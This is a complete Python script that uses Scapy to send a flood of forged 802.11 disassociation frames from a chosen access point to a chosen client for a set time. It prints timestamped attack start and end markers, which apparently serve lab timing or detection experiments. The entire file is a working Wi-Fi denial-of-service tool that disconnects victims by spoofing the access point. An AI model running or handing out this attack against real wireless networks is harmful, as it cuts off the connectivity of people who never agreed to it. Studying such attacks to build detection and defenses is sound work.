#!/usr/bin/env python3

import sys
import time
from datetime import datetime

from scapy.all import RadioTap, Dot11, Dot11Disas, sendp


def mark(label: str) -> None:
    print(
        f"{label}_ISO={datetime.now().astimezone().isoformat()} "
        f"{label}_EPOCH={time.time():.6f}",
        flush=True,
    )


def main() -> None:
    if len(sys.argv) < 6:
        print(
            "Usage: sudo python3 tools/disassoc_flood.py "
            "IFACE AP_BSSID CLIENT_MAC DURATION_SECONDS INTERVAL_SECONDS"
        )
        sys.exit(1)

    iface = sys.argv[1]
    ap_bssid = sys.argv[2]
    client_mac = sys.argv[3]
    duration_seconds = float(sys.argv[4])
    interval_seconds = float(sys.argv[5])

    packet = (
        RadioTap()
        / Dot11(
            type=0,
            subtype=10,
            addr1=client_mac,
            addr2=ap_bssid,
            addr3=ap_bssid,
        )
        / Dot11Disas(reason=8)
    )

    mark("SCAPY_ATTACK_START")

    end_time = time.time() + duration_seconds
    sent = 0

    try:
        while time.time() < end_time:
            sendp(packet, iface=iface, verbose=False)
            sent += 1
            time.sleep(interval_seconds)
    except KeyboardInterrupt:
        pass
    finally:
        mark("SCAPY_ATTACK_END")
        print(f"SENT_FRAMES={sent}", flush=True)


if __name__ == "__main__":
    main()
